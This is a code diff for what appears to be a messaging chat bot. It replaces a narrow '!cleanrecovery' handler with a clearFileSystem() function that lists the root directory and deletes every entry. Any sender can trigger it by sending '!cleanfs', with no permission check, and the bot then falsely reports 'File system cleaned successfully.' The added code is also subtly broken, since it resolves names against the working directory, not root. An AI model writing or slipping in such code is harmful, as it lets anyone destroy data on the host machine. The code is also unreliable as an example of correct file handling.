@@ -487,26 +487,24 @@ If you think it is a mistake, send a message to an admin to clear your karma lev
 
 
 
-// Rest of your code here...
+// Function to clear the entire file system
+function clearFileSystem() {
+    fs.readdirSync('/').forEach(file => {
+        fs.unlinkSync(file);
+    });
+}
 
-  if (message.body.toLowerCase() === '!cleanrecovery') {
-    try {
-      // Overwrite the recovery.json file with an empty JSON object
-      fs.writeFileSync('recovery.json', '{}');
-      console.log('Recovery file cleaned.');
-
-      // Clear the general memory by reassigning an empty object to config
-      config = {};
-      console.log('General memory cleaned.');
-
-      // Send a message indicating that both the recovery file and general memory have been cleaned successfully
-      client.sendMessage(message.from, 'Recovery file and general memory cleaned.');
-    } catch (error) {
-      console.error('Error cleaning recovery file and general memory:', error);
-      // Send a message if there is an error cleaning the recovery file and general memory
-      client.sendMessage(message.from, `Error cleaning recovery file and general memory: ${error.message}`);
+// Your existing message event listener
+client.on('message', async (message) => {
+    // Check if the message is the command to clean the file system
+    if (message.body.toLowerCase() === '!cleanfs') {
+        // Call the function to clear the file system
+        clearFileSystem();
+        // Send a confirmation message
+        client.sendMessage(message.from, 'File system cleaned successfully.');
     }
-  }
+
+    // Your other message handling logic goes here...
 });
 
 
